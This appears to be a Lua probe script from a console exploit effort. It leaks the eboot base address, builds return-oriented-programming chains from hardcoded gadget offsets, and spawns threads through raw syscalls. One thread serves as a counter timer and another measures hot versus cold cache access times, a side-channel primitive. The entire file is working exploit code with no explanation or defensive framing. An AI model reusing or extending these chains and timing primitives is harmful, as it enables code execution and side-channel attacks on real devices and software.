-- CRASH_CLASS: LOW
-- PROBE 1403r: ROP timing statistics — large strides, multiple samples
--
-- Uses 16KB stride (4 pages) to defeat Zen 2 prefetcher.
-- Runs 6 timing measurements: 2 hot, 4 cold at different offsets.
-- All timing in ROP child — zero Lua overhead in measurements.

print("=== 1403r: timing stats ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq2(a, hi, lo) wd(a, lo); wd(a + 4, hi) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function hl(n)
    return {math.floor(n / 0x100000000), n % 0x100000000}
end

-- Setup
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local pop_rax_ret   = {eb_hi, eb_lo + 0x992}
local pop_rdi_ret   = {eb_hi, eb_lo + 0xC9DFE}
local pop_rsi_ret   = {eb_hi, eb_lo + 0xD77D}
local mov_w         = {eb_hi, eb_lo + 0x92C67}
local mov_r_rsi     = {eb_hi, eb_lo + 0x1A5CC4}
local inc64_rdi_ret = {eb_hi, eb_lo + 0x161779}
local pop_rbp_ret   = {eb_hi, eb_lo + 0x79}
local leave_ret     = {eb_hi, eb_lo + 0x1A2AE3}

-- Buffers
local counter = memory.alloc(64)
local counter_n = N(counter)
for i = 0, 56, 4 do wd(counter_n + i, 0) end
local counter_hl = hl(counter_n)

local result = memory.alloc(1024)
local result_n = N(result)
for i = 0, 1020, 4 do wd(result_n + i, 0) end

-- Hot data
local hot_data = memory.alloc(64)
local hot_n = N(hot_data)
wq2(hot_n, 0xAAAA, 0xBBBBCCCC)

-- Cold data: 256KB, use 16KB strides to defeat prefetch
local cold_buf = memory.alloc(0x40000)
local cold_n = N(cold_buf)

-- ============================================================
-- Timer thread
-- ============================================================
local STSZ = 0x4000
local stk1 = memory.alloc(STSZ + 128)
local stk1_n = N(stk1)
for i = 0, STSZ + 124, 4 do wd(stk1_n + i, 0) end
local rsp1 = math.floor((stk1_n + STSZ) / 16) * 16 - 8

wq2(rsp1,      0, 0xDEAD)
wq2(rsp1 + 8,  inc64_rdi_ret[1], inc64_rdi_ret[2])
wq2(rsp1 + 16, pop_rbp_ret[1], pop_rbp_ret[2])
wq2(rsp1 + 24, hl(rsp1)[1], hl(rsp1)[2])
wq2(rsp1 + 32, leave_ret[1], leave_ret[2])

local sc_thr = mk(455)
local p1 = memory.alloc(0x40)
local p1n = N(p1)
wq2(p1n, pop_rax_ret[1], pop_rax_ret[2])
wq2(p1n + 0x08, get_hi_lo(counter))
wq2(p1n + 0x10, get_hi_lo(stk1))
wq2(p1n + 0x18, 0, STSZ)
wq2(p1n + 0x30, 0, 0)
pcall(function()
    sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p1n / 0x100000000), p1n % 0x100000000)),
        uint64("0x38"))
end)

local dummy = 0
for i = 1, 3000 do dummy = dummy + 1 end
local tc = rd(counter_n) or 0
print(string.format("timer: %d", tc))
if tc == 0 then print("DEAD"); return end

-- ============================================================
-- Reader chain: 10 timed measurements
-- ============================================================
-- Pattern per measurement:
--   pop_rsi → &counter; mov_r_rsi (read before)
--   pop_rdi → &result[N]; mov_w (store before)
--   pop_rsi → &target; mov_r_rsi (access)
--   pop_rsi → &counter; mov_r_rsi (read after)
--   pop_rdi → &result[N+8]; mov_w (store after)
-- = 11 slots per measurement

local c = {}
c[1] = {0, 0xBBBB}  -- dummy for entry pop_rax

-- Pre-touch hot_data (read it once to warm cache)
c[#c+1] = pop_rsi_ret
c[#c+1] = hl(hot_n)
c[#c+1] = mov_r_rsi

-- Measurement helper
local roff = 0  -- result offset
local function emit_timed_access(target_hl, label)
    -- read counter before
    c[#c+1] = pop_rsi_ret
    c[#c+1] = counter_hl
    c[#c+1] = mov_r_rsi
    c[#c+1] = pop_rdi_ret
    c[#c+1] = hl(result_n + roff)
    c[#c+1] = mov_w
    -- access target
    c[#c+1] = pop_rsi_ret
    c[#c+1] = target_hl
    c[#c+1] = mov_r_rsi
    -- read counter after
    c[#c+1] = pop_rsi_ret
    c[#c+1] = counter_hl
    c[#c+1] = mov_r_rsi
    c[#c+1] = pop_rdi_ret
    c[#c+1] = hl(result_n + roff + 8)
    c[#c+1] = mov_w
    roff = roff + 16
end

-- Measurements:
-- H1: hot access (just warmed)
emit_timed_access(hl(hot_n), "hot1")
-- H2: hot again
emit_timed_access(hl(hot_n), "hot2")
-- C1: cold at +0x00000 (start of cold buf)
emit_timed_access(hl(cold_n), "cold1_0x0")
-- C2: cold at +0x10000 (64KB away)
emit_timed_access(hl(cold_n + 0x10000), "cold2_64K")
-- C3: cold at +0x20000 (128KB away)
emit_timed_access(hl(cold_n + 0x20000), "cold3_128K")
-- C4: cold at +0x30000 (192KB away)
emit_timed_access(hl(cold_n + 0x30000), "cold4_192K")
-- H3: hot again after all the cold accesses
emit_timed_access(hl(hot_n), "hot3")
-- C5: re-access cold+0x0 (now in cache from C1)
emit_timed_access(hl(cold_n), "warm1_0x0")

-- Done marker
c[#c+1] = pop_rax_ret
c[#c+1] = {0, 0xD0D0D0D0}
c[#c+1] = pop_rdi_ret
c[#c+1] = hl(result_n + roff)
c[#c+1] = mov_w

-- Infinite loop
local loop_slot = #c + 3  -- index of loop body dummy
-- entry: pop_rbp, &loop_base, leave
-- body: dummy, pop_rbp, &loop_base, leave
c[#c+1] = pop_rbp_ret
local lb_idx = #c + 1
c[#c+1] = {0, 0}  -- placeholder
c[#c+1] = leave_ret
local lb_body = #c + 1
c[#c+1] = {0, 0xAAAA}
c[#c+1] = pop_rbp_ret
c[#c+1] = {0, 0}  -- placeholder
c[#c+1] = leave_ret

-- Allocate stack + chain space
local STSZ2 = 0x4000
local CPAD = #c * 8 + 64
local stk2 = memory.alloc(STSZ2 + CPAD)
local stk2_n = N(stk2)
for i = 0, STSZ2 + CPAD - 4, 4 do wd(stk2_n + i, 0) end
local rsp2 = math.floor((stk2_n + STSZ2) / 16) * 16 - 8

-- Fill loop_base address
local lb_addr = rsp2 + (lb_body - 1) * 8
local lb_hl = hl(lb_addr)
c[lb_idx] = lb_hl
c[lb_body + 2] = lb_hl

print(string.format("chain: %d slots (%d B), rsp2=0x%X", #c, #c * 8, rsp2))

-- Write chain
for i = 1, #c do
    wq2(rsp2 + (i-1)*8, c[i][1], c[i][2])
end

-- Start reader
local p2 = memory.alloc(0x40)
local p2n = N(p2)
wq2(p2n, pop_rax_ret[1], pop_rax_ret[2])
wq2(p2n + 0x08, 0, 0)
wq2(p2n + 0x10, hl(stk2_n)[1], hl(stk2_n)[2])
wq2(p2n + 0x18, 0, STSZ2)
wq2(p2n + 0x30, 0, 0)
pcall(function()
    sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p2n / 0x100000000), p2n % 0x100000000)),
        uint64("0x38"))
end)

-- Wait
local found = false
for w = 1, 2000 do
    if rd(result_n + roff) == 0xD0D0D0D0 then
        found = true
        break
    end
    for j = 1, 10 do dummy = dummy + 1 end
end
print(string.format("done=%s", tostring(found)))

-- ============================================================
-- Results
-- ============================================================
print("")
local labels = {"hot1", "hot2", "cold1_0K", "cold2_64K", "cold3_128K", "cold4_192K", "hot3", "warm1_0K"}
for i = 1, 8 do
    local off = (i-1) * 16
    local before = rd(result_n + off) or 0
    local after  = rd(result_n + off + 8) or 0
    local delta = after - before
    print(string.format("%-12s: delta=%3d  (b=%d a=%d)", labels[i], delta, before, after))
end

print("")
print("=== 1403r DONE ===")
